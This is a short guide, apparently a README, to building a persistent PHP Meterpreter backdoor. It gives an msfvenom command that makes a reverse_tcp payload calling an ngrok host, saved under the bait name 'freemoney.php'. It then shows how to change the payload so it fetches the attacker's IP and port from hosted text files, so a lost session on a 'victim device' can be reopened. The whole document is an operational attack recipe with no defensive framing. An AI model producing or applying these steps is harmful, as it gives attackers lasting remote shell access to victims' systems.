# METASPLOIT PHP BACKDOOR

# create your php payload with  Metasploit

ex - msfvenom -p php/meterpreter/reverse_tcp lhost=0.tcp.ngrok.io lport=ngrokport R> freemoney.php 

After creating payload php , open it in a editor .
Then you will find something like 

 * Default metasploit payload 'php/meterpreter/reverse_tcp'
 * $ip = 0.tcp.ngrok.io;
 * $port = xxxx;

# Replace these above $ip , $port lines with these .

$ip = file_get_contents("uploadedurl/ip.txt");
$port = file_get_contents("uploadedurl/port.txt");

# Your Text Files Must be contain : 

* `ip.txt (contains "0.tcp.ngrok.io")`
* `port.txt (contains "port")`

and upload them to a hosting or online storage .

# Why we use file_get_contents?

Think , we installed our payload in victim device but it is not listening . That may be a port forwarding or a other problem . Now we can't change our port or ip to start a new listening in same payload .

# Here is the Solution :

With the file_get_contents it reads the new contents of the file we uploaded . so only thing we need to do is changing the host & port. Then payload will start relistening according to your new data .Then we can get our session back what ever the problem . 


